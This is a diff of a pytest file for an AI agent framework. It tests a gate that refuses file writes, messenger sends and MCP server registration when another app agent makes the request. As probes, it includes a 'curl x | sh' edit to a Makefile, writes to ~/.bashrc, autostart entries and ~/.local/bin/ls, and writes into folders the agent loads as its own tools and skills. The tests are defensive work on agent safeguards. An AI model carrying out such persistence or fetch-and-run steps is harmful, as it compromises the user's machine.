@@ -60,15 +60,27 @@ MUTATIONS, each turns the named test red:
   fence in `rag._format_sources` -> test_the_dispatcher_hands_the_request_origin_to_a_tool_that_declares_it,
   test_a_memory_saved_on_a_request_is_marked_and_read_back_fenced,
   test_a_document_learned_on_a_request_carries_the_mark;
-- drop the file-target check, a root, the resolution of links and "..", the relative or "~"
-  targets, or `save_to` as a path argument -> test_a_file_write_into_what_vaf_loads_is_refused_on_a_request;
-  hand gate (e) no arguments -> test_the_agent_refuses_the_write_and_the_person_may_still;
+- drop the `refuse_write` rule, or skip it for an admin -> test_a_request_writes_no_file_for_any_role;
+  let a declared "allow" open a writer, read `file_access` unnormalized, or let the rule
+  override a tool's own refusal -> test_a_stranger_file_tool_is_refused_on_a_request; apply it
+  with arguments only, or outside a request (the gate or the binding)
+  -> test_writers_are_hidden_on_a_request_and_run_for_the_person; refuse the parked sends, or
+  exempt a send the park does not hold (WhatsApp to the user's own number)
+  -> test_the_sends_declare_the_hold_and_only_parkable_ones_hold,
+  test_a_request_holds_sends_in_the_agent, test_a_request_sends_nothing_to_the_users_own_messengers;
+  exempt one writer by name -> test_every_file_access_write_tool_is_refused_on_a_request;
+  drop the declaration of a writer without the mode (git_init, update_codex, set_git_coauthor,
+  document_agent, ...) -> test_no_tool_writes_files_on_a_request_unseen and its
+  test_each_refused_tool_declares_itself case, a stale reviewed entry -> the same guard;
+  drop or widen `python_sandbox.agent_request_for` -> test_python_sandbox_exports_nothing_on_a_request;
+  bring back the path resolution -> test_the_path_part_is_gone;
 - replay a stored user message raw -> test_a_stored_request_is_replayed_inside_its_fence;
 - let the compaction keep a request or its answer -> test_the_compaction_learns_nothing_from_a_request;
 - print memory_save's duplicate snippet raw
   -> test_the_duplicate_notice_of_memory_save_reads_a_marked_memory_fenced;
 - open a non-read MCP tool, or let mcp_call ignore the reached tool's level or its
-  `server_command` -> test_mcp_tools_beyond_read_need_the_person.
+  `server_command` -> test_mcp_tools_beyond_read_need_the_person; drop the gate's argument
+  repair -> test_mcp_call_is_decided_on_the_repaired_arguments.
 """
 import contextvars
 import json
@@ -753,9 +765,10 @@ _DECLARED = {
     "refuse_standing": ["checkpoint_context", "create_skill", "update_skill", "delete_skill",
                         "update_user_identity",
                         "create_contact", "update_contact", "add_automation_note",
-                        "add_automation_todo", "thinking_note_add"],
+                        "add_automation_todo", "thinking_note_add", "update_codex",
+                        "add_memory", "set_git_coauthor"],
     "refuse_person": ["user_phone", "store_credential", "github_create_issue",
-                      "github_update_file"],
+                      "github_update_file", "git_init", "git_add_commit", "document_agent"],
 }
 _WORDS = {"refuse_work": "keeps running after this request",
           "refuse_standing": "from now on", "refuse_person": "needs your user's confirmation"}
@@ -781,8 +794,8 @@ def test_each_refused_tool_declares_itself(agent_world, kind, name):
 
 
 @pytest.mark.parametrize("name", ["memory_save", "memory_update", "learn_document",
-                                  "update_codex", "add_memory", "update_intent",
-                                  "update_working_memory", "ask_user", "research_agent"])
+                                  "update_intent", "update_working_memory", "ask_user",
+                                  "research_agent"])
 def test_a_request_may_keep_memory_and_ask_back(agent_world, name):
     """The named boundary in agent_origin: the memory writes stay (their rows come back
     fenced), the chat's own goal and plan stay, and a question back goes out as the answer."""
@@ -810,6 +823,27 @@ def test_the_sends_declare_the_hold_and_only_parkable_ones_hold():
     for name, cls in agent_src_tools.items():
         assert resolve_tool_contract(name, cls).agent_request == "hold", name
         assert agent_request_kind(name, cls, "veyllo_app") is None
+    # The parked two declare `file_access = "write"` (the root set an attachment is read from)
+    # and stay parked: the park is the user's confirmation. The sends to the user's own
+    # messengers declare the same mode, hold nothing, and are refused with the other writers.
+    from vaf.tools.send_discord import SendDiscordTool
+    from vaf.tools.send_telegram import SendTelegramTool
+    from vaf.tools.send_to_user import SendToUserTool
+    from vaf.tools.send_veyllo_app import SendVeylloAppTool
+    assert {agent_src_tools["send_mail"].file_access,
+            agent_src_tools["send_whatsapp"].file_access} == {"write"}
+    for cls in (SendToUserTool, SendTelegramTool, SendDiscordTool, SendVeylloAppTool):
+        assert cls.file_access == "write"
+        assert agent_request_kind(cls.name, cls, "veyllo_app") == "refuse_write", cls.name
+    # Per call: a WhatsApp message to a number is parked; one to the user's own number is not,
+    # so it is refused like the other sends to the user's own messengers.
+    whatsapp = agent_src_tools["send_whatsapp"]()
+    for args, kind in (({"to_phone": "+491700000001", "message": "hi"}, None),
+                       ({"phone_number": "+491700000002", "message": "hi"}, None),
+                       ({"message": "to myself"}, "refuse_write")):
+        assert agent_request_kind("send_whatsapp", whatsapp, "veyllo_app", args) == kind, args
+    assert agent_request_kind("send_mail", agent_src_tools["send_mail"](), "veyllo_app",
+                              {"to": "x@example.org"}) is None
     # A tool of somebody else's that declares a hold: no park lane holds it, so it is refused.
     assert agent_request_kind("my_sender", _Tool("my_sender", agent_request="hold")) \
         == "refuse_person"
@@ -819,8 +853,7 @@ def test_the_sends_declare_the_hold_and_only_parkable_ones_hold():
 
 # Reviewed: allowed in a request, with the reason.
 _ALLOWED_REVIEWED = {
-    "research_agent": "searches the web and writes a report",
-    "document_agent": "writes a document",
+    "research_agent": "searches the web and writes a report VAF names",
     "delete_automation": "removes an automation; starts nothing",
     "delete_automation_note": "removes a note; starts nothing",
     "delete_automation_todo": "removes a todo; starts nothing",
@@ -919,6 +952,10 @@ def test_a_request_holds_sends_in_the_agent(agent_world, monkeypatch):
                         lambda name, args, **k: parked.append((name, args, k)) or 7)
     agent = agent_world.make()
     whatsapp, mail = _Tool("send_whatsapp"), _Tool("send_mail")
+    # The real ones declare the mode of a file writer (the root set an attachment is read
+    # from): the park is what keeps them open on a request.
+    whatsapp.file_access = mail.file_access = "write"
+    whatsapp.agent_request = mail.agent_request = "hold"
     agent.tools.update({"send_whatsapp": whatsapp, "send_mail": mail})
     _ask_turn(agent)
     out = agent.execute_tool("send_whatsapp", {"to_phone": "+491700000001", "message": "hi"})
@@ -1175,92 +1212,7 @@ def test_a_learned_document_is_marked_only_on_a_request(monkeypatch, request_ori
     assert stored and all(m.get("origin") == request_origin for m in stored), stored
 
 
-# ── round 3: files VAF loads as its own behaviour, the replay, the compaction, MCP ──────
-
-@pytest.fixture
-def standing_home(agent_world, monkeypatch, runner_world):
-    """A home of the test's own: the custom tools folder, the skills and the workflows."""
-    home = runner_world.tmp / "userhome"
-    home.mkdir()
-    monkeypatch.setenv("HOME", str(home))
-    monkeypatch.setenv("USERPROFILE", str(home))
-    monkeypatch.setattr(Path, "home", classmethod(lambda cls: home))
-    from vaf.core.platform import Platform as _Platform
-    for folder in (_Platform.data_dir() / "custom_tools", home / ".vaf" / "skills" / "daily",
-                   home / ".vaf" / "workflows"):
-        folder.mkdir(parents=True, exist_ok=True)
-    return SimpleNamespace(home=home, data=_Platform.data_dir(), workspace=runner_world.tmp / "ws")
-
-
-def test_the_standing_roots_are_the_ones_vaf_loads(standing_home):
-    from vaf.core.agent_origin import _inside, standing_roots
-    from vaf.core.custom_tools_registry import get_custom_tools_dir
-    from vaf.core.mcp_registry import get_mcp_manifest_path as mcp_manifest
-    from vaf.core.platform import Platform
-    from vaf.core.skills_registry import get_skills_dir
-    roots = standing_roots()
-    for path in (get_custom_tools_dir() / "x.py", mcp_manifest(), get_skills_dir() / "a",
-                 standing_home.home / ".vaf" / "workflows" / "w.json",
-                 Platform.config_dir() / "trust" / "policies.json"):
-        assert any(_inside(r, path.resolve()) for r in roots), path
-    # The chat's workspace is outside all of them.
-    workspace = Platform.documents_dir() / "VAF_Projects" / "ab12cd34" / RUNNER_CHAT
-    assert not any(_inside(r, workspace.resolve()) for r in roots)
-
-
-def test_a_file_write_into_what_vaf_loads_is_refused_on_a_request(standing_home):
-    from vaf.core.agent_origin import agent_request_kind
-    from vaf.tools.download_file import DownloadFileTool
-    from vaf.tools.filesystem import EditFileTool, WriteFileTool
-    write, edit, download = WriteFileTool(), EditFileTool(), DownloadFileTool()
-    home, data = standing_home.home, standing_home.data
-    ws = standing_home.workspace
-    ws.mkdir()
-    try:
-        (ws / "skills_link").symlink_to(home / ".vaf" / "skills", target_is_directory=True)
-        linked = True
-    except OSError:  # Windows without the symlink privilege
-        linked = False
-    bases = (ws,)
-    refused = [
-        (write, {"path": str(data / "custom_tools" / "x.py")}),
-        (write, {"path": str(data / "custom_tools" / "manifest.json")}),
-        (write, {"path": "~/.vaf/skills/daily/SKILL.md"}),
-        (write, {"path": str(home / ".vaf" / "skills" / "manifest.json")}),
-        (write, {"path": str(home / ".vaf" / "workflows" / "wf.json")}),
-        (edit, {"path": str(home / ".vaf" / "workflows" / "wf.py"), "edits": []}),
-        (download, {"url": "https://example.org/x", "save_to": "~/.vaf/workflows/w.py"}),
-        # Upwards out of the workspace, and through a link inside it.
-        (write, {"path": "../userhome/.vaf/skills/daily/SKILL.md"}),
-    ] + ([
-        (write, {"path": "skills_link/daily/SKILL.md"}),
-        (write, {"path": str(ws / "skills_link" / "new" / "SKILL.md")}),
-    ] if linked else [])
-    for tool, args in refused:
-        assert agent_request_kind(tool.name, tool, "veyllo_app", args, bases) \
-            == "refuse_standing", args
-    allowed = [
-        (write, {"path": "notes/plan.md"}),
-        (write, {"path": str(home / "Documents" / "plan.md")}),
-        (write, {"path": str(home / ".vaf" / "skillsx" / "a.md")}),
-        (write, {"path": "x.md", "content": "see ~/.vaf/skills/daily/SKILL.md"}),
-    ]
-    for tool, args in allowed:
-        assert agent_request_kind(tool.name, tool, "veyllo_app", args, bases) is None, args
-
-
-def test_the_agent_refuses_the_write_and_the_person_may_still(standing_home, agent_world):
-    agent = agent_world.make()
-    target = standing_home.data / "custom_tools" / "probe_tool.py"
-    _ask_turn(agent)
-    out = agent.execute_tool("write_file", {"path": str(target), "content": "x = 1\n"})
-    assert out.startswith("[APP AGENT]") and "from now on" in out, out
-    assert not target.exists()
-    # The gate decides on a request only: the person's own turn is not refused by it.
-    _ask_turn(agent, asked=False)
-    assert agent._agent_request_gate_decision(
-        "write_file", agent.tools["write_file"], {"path": str(target)}) is None
-
+# ── round 3: the replay, the compaction, MCP ──────────────────────────────────────────
 
 def test_a_stored_request_is_replayed_inside_its_fence(agent_world):
     from vaf.core.agent_origin import APP_AGENT_KIND, app_agent_request_text
@@ -1350,27 +1302,25 @@ def _admin_ask_turn(agent):
                                  session_id=RUNNER_CHAT, asked_by_agent="veyllo_app"))
 
 
-def test_the_gate_decides_on_the_arguments_the_tool_receives(standing_home, agent_world):
+def test_the_gate_decides_on_the_arguments_the_tool_receives(ask_home, agent_world):
+    """An aliased or a placeholder-wrapped target is refused like any other write, and nothing
+    is written (the rule needs no target at all)."""
     agent = agent_world.make()
     _admin_ask_turn(agent)
-    data, home = standing_home.data, standing_home.home
+    data, home = ask_home.data, ask_home.home
     probes = [
         ("filepath", str(data / "custom_tools" / "b.py")),
         ("file", str(data / "custom_tools" / "c.py")),
         ("path", {"value": str(data / "custom_tools" / "d.py")}),
         ("path", {"value": "~/.vaf/skills/daily/SKILL.md"}),
         ("filepath", "~/.vaf/skills/daily/SKILL.md"),
+        ("path", ["a", "b"]),
     ]
     for key, value in probes:
         out = agent.execute_tool("write_file", {key: value, "content": "x = 1\n"})
-        assert out.startswith("[APP AGENT]"), (key, value, out)
-    assert not list((data / "custom_tools").glob("*.py"))
+        assert _refused_for_writing(out), (key, value, out)
+    assert not (data / "custom_tools").exists() or not list((data / "custom_tools").glob("*.py"))
     assert not (home / ".vaf" / "skills" / "daily" / "SKILL.md").exists()
-    # A path argument that stays no string after the repair is refused, never skipped.
-    from vaf.core.agent_origin import agent_request_kind
-    write = agent.tools["write_file"]
-    assert agent_request_kind("write_file", write, "veyllo_app",
-                              {"path": ["a", "b"]}, ()) == "refuse_standing"
 
 
 @pytest.fixture
@@ -1411,7 +1361,7 @@ def test_mcp_call_is_decided_on_the_repaired_arguments(agent_world, mcp_world):
     assert mcp_world == ["list_rooms"]
 
 
-def test_a_request_cannot_register_an_mcp_server_and_run_it(standing_home, agent_world,
+def test_a_request_cannot_register_an_mcp_server_and_run_it(ask_home, agent_world,
                                                             monkeypatch):
     from vaf.core.mcp_registry import get_mcp_manifest_path
     import vaf.tools.mcp_client as mcp_client
@@ -1429,7 +1379,7 @@ def test_a_request_cannot_register_an_mcp_server_and_run_it(standing_home, agent
     out = agent.execute_tool("write_file", {
         "path": str(manifest),
         "content": '{"servers": {"notes": {"command": "python srv.py", "permission_level": "read"}}}'})
-    assert out.startswith("[APP AGENT]") and "from now on" in out, out
+    assert _refused_for_writing(out), out
     assert not manifest.exists()
     out = agent.execute_tool("mcp_call", {"server": "notes", "tool_name": "list"})
     assert out.startswith("[APP AGENT]"), out
@@ -1445,3 +1395,270 @@ def test_a_checkpoint_on_a_request_leaves_no_restored_context(agent_world):
     assert out.startswith("[APP AGENT]") and "from now on" in out, out
     assert "x@example.org" not in json.dumps(agent.history, default=str)
     assert "x@example.org" not in _build_compaction_conversation_excerpt(agent)
+
+
+# ── no tool writes a file on a request, for any role and wherever it would write ─────────
+
+@pytest.fixture
+def ask_home(agent_world, monkeypatch, runner_world):
+    """A home of the test's own, so a write that got through would land in the scratch tree;
+    the chat's workspace and the account's projects root under the test's documents folder."""
+    from vaf.core.session import get_session_workspace_dir, get_user_projects_root
+    home = runner_world.tmp / "userhome"
+    home.mkdir()
+    monkeypatch.setenv("HOME", str(home))
+    monkeypatch.setenv("USERPROFILE", str(home))
+    monkeypatch.setattr(Path, "home", classmethod(lambda cls: home))
+    workspace = get_session_workspace_dir(RUNNER_CHAT, create=True, user_scope_id=RUNNER_SCOPE)
+    return SimpleNamespace(home=home, data=Platform.data_dir(), workspace=workspace,
+                           projects=get_user_projects_root(RUNNER_SCOPE))
+
+
+def _refused_for_writing(out) -> bool:
+    return (str(out).startswith("[APP AGENT]") and "it writes files" in str(out)
+            and "later update" in str(out))
+
+
+_FILE_TOOLS = ("write_file", "edit_file", "download_file", "document_writer")
+_ROLE_TURNS = {"user": lambda agent: _ask_turn(agent), "admin": lambda agent: _admin_ask_turn(agent)}
+
+
+@pytest.mark.parametrize("role", ["user", "admin"])
+def test_a_request_writes_no_file_for_any_role(ask_home, agent_world, monkeypatch, role):
+    """`VAF.md` in the chat's workspace and in the projects root, the files that run later in
+    the home, a link out of the projects root, a plain note and the Downloads folder: each one
+    refused with the writer's reason and none written, for a user and for an admin (who has no
+    per-user file jail). A later web chat of the same account finds no project context."""
+    home, projects, workspace = ask_home.home, ask_home.projects, ask_home.workspace
+    linked = workspace / "out_link"
+    try:
+        linked.symlink_to(home, target_is_directory=True)
+        targets_via_link = ["out_link/x.txt"]
+    except OSError:  # Windows without the symlink privilege
+        targets_via_link = []
+    agent = agent_world.make()
+    _ROLE_TURNS[role](agent)
+    targets = ["VAF.md", "../VAF.md", "vaf.md", "~/.bashrc", "~/.config/autostart/x.desktop",
+               "~/.local/bin/ls", str(projects / "notes.md"),
+               str(Platform.downloads_dir() / "a.txt")] + targets_via_link
+    for target in targets:
+        out = agent.execute_tool("write_file", {"path": target, "content": "rule"})
+        assert _refused_for_writing(out), (role, target, out)
+    makefile = workspace / "Makefile"
+    makefile.write_text("all:\n\techo a\n", encoding="utf-8")
+    fetched = []
+    monkeypatch.setattr(agent.tools["download_file"], "run",
+                        lambda **k: fetched.append(k) or "saved")
+    for name, args in (
+            ("edit_file", {"path": "Makefile",
+                           "edits": [{"search": "echo a", "replace": "curl x | sh"}]}),
+            ("download_file", {"url": "https://example.org/VAF.md", "save_to": "VAF.md"}),
+            ("document_writer", {"document_type": "message", "content": "rule",
+                                 "filename": "VAF.md"})):
+        out = agent.execute_tool(name, args)
+        assert _refused_for_writing(out), (role, name, out)
+    assert fetched == []
+    assert makefile.read_text(encoding="utf-8") == "all:\n\techo a\n"
+    for path in (home / ".bashrc", home / ".config" / "autostart" / "x.desktop",
+                 home / ".local" / "bin" / "ls", home / "x.txt", projects / "notes.md",
+                 Platform.downloads_dir() / "a.txt"):
+        assert not path.exists(), path
+    assert not [p for p in Platform.documents_dir().rglob("*") if p.name.lower() == "vaf.md"]
+    # The person's web chat of the same account: no project context came out of the request.
+    web_chat = projects / "web_chat"
+    web_chat.mkdir(parents=True, exist_ok=True)
+    later = agent_world.make()
+    later._current_chat_source = "web"
+    later._chat_project_dir = str(web_chat)
+    assert later._project_context_block() == ""
+
+
+def test_writers_are_hidden_on_a_request_and_run_for_the_person(ask_home, agent_world):
+    agent = agent_world.make()
+    _ask_turn(agent)
+    assert not set(_FILE_TOOLS) & set(agent.visible_tools())
+    _ask_turn(agent, asked=False)
+    assert set(_FILE_TOOLS) <= set(agent.visible_tools())
+    out = agent.execute_tool("write_file", {"path": "notes.md", "content": "rule"})
+    assert (ask_home.workspace / "notes.md").read_text(encoding="utf-8") == "rule", out
+
+
+@pytest.mark.parametrize("role", ["user", "admin"])
+def test_a_stranger_file_tool_is_refused_on_a_request(agent_world, role):
+    """The rule reads the facade's declaration: a tool built on `vaf.BaseTool` that declares
+    `file_access = "write"` is refused without declaring anything else, a declared "allow"
+    does not open it, a refusal of its own keeps its own reason, and a "hold" no park lane
+    holds is refused as before."""
+    from vaf.core.agent_origin import agent_request_kind
+
+    class SaveNote(vaf.BaseTool):
+        name = "save_note"
+        description = "Save a note."
+        file_access = "write"
+        identity_kwargs = ("user_scope_id", "user_role")
+        parameters = {"type": "object", "properties": {"path": {"type": "string"}}}
+
+        def __init__(self):
+            self.calls = []
+
+        def run(self, **kwargs):
+            self.calls.append(kwargs)
+            return "saved"
+
+    class Allowed(SaveNote):
+        agent_request = "allow"
+
+    class Working(SaveNote):
+        agent_request = "refuse_work"
+
+    class Holding(SaveNote):
+        agent_request = "hold"
+
+    spelled = SaveNote()
+    spelled.file_access = " Write"
+    for tool, kind in ((SaveNote(), "refuse_write"), (Allowed(), "refuse_write"),
+                       (spelled, "refuse_write"), (Working(), "refuse_work"),
+                       (Holding(), "refuse_person")):
+        assert agent_request_kind("save_note", tool, "veyllo_app") == kind, type(tool).__name__
+    agent = agent_world.make()
+    tool = Allowed()
+    agent.tools["save_note"] = tool
+    _ROLE_TURNS[role](agent)
+    assert _refused_for_writing(agent.execute_tool("save_note", {"path": "VAF.md"}))
+    assert tool.calls == [] and "save_note" not in agent.visible_tools()
+    _ask_turn(agent, asked=False)
+    assert agent.execute_tool("save_note", {"path": "notes.md"}) == "saved"
+
+
+_SELF_SENDS = ("send_to_user", "send_telegram", "send_discord", "send_veyllo_app")
+
+
+@pytest.mark.parametrize("role", ["user", "admin"])
+def test_a_request_sends_nothing_to_the_users_own_messengers(agent_world, monkeypatch, role):
+    """The sends to the user's own messengers declare `file_access = "write"` (the root set an
+    attachment is read from) and hold nothing, so they are refused with the other writers; the
+    parked sends are covered by test_a_request_holds_sends_in_the_agent."""
+    agent = agent_world.make()
+    sent = []
+    for name in _SELF_SENDS + ("send_whatsapp",):
+        monkeypatch.setattr(agent.tools[name], "run",
+                            lambda _n=name, **k: sent.append(_n) or "sent")
+    _ROLE_TURNS[role](agent)
+    for name in _SELF_SENDS:
+        out = agent.execute_tool(name, {"message": "hi"})
+        assert _refused_for_writing(out), (name, out)
+        assert name not in agent.visible_tools()
+    # WhatsApp to the user's own number: not parked, so refused too; the tool stays offered
+    # for a message to somebody else, which is parked.
+    out = agent.execute_tool("send_whatsapp", {"message": "to myself"})
+    assert _refused_for_writing(out), out
+    assert "send_whatsapp" in agent.visible_tools()
+    assert sent == []
+
+
+def test_every_file_access_write_tool_is_refused_on_a_request(agent_world):
+    """Over the real registry: every tool that declares `file_access = "write"` is refused as a
+    writer, kept off chats, or is a send a park lane holds; nothing else is let through."""
+    from vaf.core.agent_origin import agent_request_kind
+    from vaf.core.outbound_hold import THIRD_PARTY_SEND_TOOLS
+    from vaf.core.tool_contract import resolve_tool_contract
+    agent = agent_world.make()
+    writers = {n: t for n, t in agent.tools.items() if getattr(t, "file_access", None) == "write"}
+    assert set(_FILE_TOOLS) | set(_SELF_SENDS) | {"send_mail", "send_whatsapp"} <= set(writers)
+    kinds = {n: agent_request_kind(n, t, "veyllo_app") for n, t in writers.items()}
+    for name, kind in kinds.items():
+        if kind is None:
+            assert name in THIRD_PARTY_SEND_TOOLS and \
+                resolve_tool_contract(name, writers[name]).agent_request == "hold", name
+        else:
+            assert kind in ("refuse_write", "off_chats"), (name, kind)
+    assert {n for n, k in kinds.items() if k == "refuse_write"} >= set(_FILE_TOOLS) | set(_SELF_SENDS)
+    assert {n for n, k in kinds.items() if k is None} == {"send_mail", "send_whatsapp"}
+    assert agent_request_kind("send_whatsapp", writers["send_whatsapp"], "veyllo_app",
+                              {"message": "to myself"}) == "refuse_write"
+
+
+# What a static read of a module counts as writing a file (or VAF's settings).
+_WRITES = re.compile(
+    r"""open\([^)]*['"][wax]b?\+?['"]|\.write_text\(|\.write_bytes\(|shutil\.(copy|move|unpack|copytree)"""
+    r"""|extractall|"cp",|run_project_git\(|Config\.set\(|os\.replace\(|os\.rename\(|atomic_write"""
+    r"""|\.mkdir\(|makedirs\(|append_codex|append_memory|save_document_model""")
+
+# Reviewed: a request may run it although its module writes, with the reason.
+_WRITES_REVIEWED = {
+    "python_sandbox": "decided per call: a run with export_files is refused, a run without "
+                      "touches only the container's scratch volume",
+    "research_agent": "writes its report under a name VAF builds, research_<topic>_<time>, "
+                      "and its own checkpoints",
+    "cloud_storage": "download and retrieve write into the user's Downloads folder, no "
+                     "ancestor of a project folder; pending: to be decided per call",
+    "web_search": "VAF's own cache and debug files, named by VAF",
+    "webfetch": "VAF's own cache and debug files, named by VAF",
+    "read_file": "a read tool; its module holds write_file and edit_file, which are refused",
+    "list_files": "a read tool; its module holds write_file and edit_file, which are refused",
+    "find_files": "a read tool; its module holds write_file and edit_file, which are refused",
+    "tree": "a read tool; its module holds write_file and edit_file, which are refused",
+    "git_status": "a read tool; its module holds the git writers, which are refused",
+    "git_log": "a read tool; its module holds the git writers, which are refused",
+}
+
+
+def test_no_tool_writes_files_on_a_request_unseen(agent_world):
+    """Every tool a request may run whose module source writes files is reviewed here with its
+    reason, and the list holds no stale entry (each one still allowed and still writing). A new
+    writer that declares neither `file_access = "write"` nor a refusal cannot slip through.
+    NAMED BOUNDARY: a static read of the tool's own module; a write through a helper in
+    another module that the pattern does not name is not seen (test_every_file_access_write_*
+    still covers every tool with the mode)."""
+    import inspect
+    import sys
+    from vaf.core.agent_origin import agent_request_kind
+    agent = agent_world.make()
+    sources = {}
+    unseen = []
+    allowed = set()
+    for name, tool in sorted(agent.tools.items()):
+        if agent_request_kind(name, tool, "veyllo_app") is not None:
+            continue
+        allowed.add(name)
+        module = type(tool).__module__
+        if module not in sources:
+            try:
+                sources[module] = inspect.getsource(sys.modules[module])
+            except (KeyError, OSError, TypeError):
+                sources[module] = ""
+        if _WRITES.search(sources[module]):
+            unseen.append(name)
+    assert {"memory_save", "ask_user"} <= allowed
+    assert sorted(set(unseen) - set(_WRITES_REVIEWED)) == [], "writes files, not reviewed"
+    assert sorted(set(_WRITES_REVIEWED) - set(unseen)) == [], "stale reviewed entries"
+
+
+@pytest.mark.parametrize("role", ["user", "admin"])
+def test_python_sandbox_exports_nothing_on_a_request(agent_world, monkeypatch, role):
+    from vaf.core.agent_origin import agent_request_kind
+    agent = agent_world.make()
+    tool = agent.tools["python_sandbox"]
+    runs = []
+    monkeypatch.setattr(tool, "run", lambda **k: runs.append(k) or "ran")
+    _ROLE_TURNS[role](agent)
+    for exports in (["VAF.md"], "VAF.md"):
+        out = agent.execute_tool("python_sandbox", {"code": "open('VAF.md', 'w').write('x')",
+                                                    "export_files": exports})
+        assert out.startswith("[APP AGENT]"), (exports, out)
+    assert runs == []
+    assert agent_request_kind("python_sandbox", tool, "veyllo_app", {"code": "print(1)"}) is None
+    assert "python_sandbox" in agent.visible_tools()
+
+
+def test_the_path_part_is_gone():
+    """The rule needs no target: the resolution of a write's path is not kept around."""
+    import inspect
+    from vaf.core import agent_origin
+    from vaf.core.agent import Agent
+    for name in ("standing_roots", "standing_write_target", "_target_values", "_PATH_ARGS",
+                 "_inside"):
+        assert not hasattr(agent_origin, name), name
+    assert not hasattr(Agent, "_write_bases")
+    for func in (agent_origin.agent_request_kind, agent_origin.agent_request_refusal):
+        assert "bases" not in inspect.signature(func).parameters
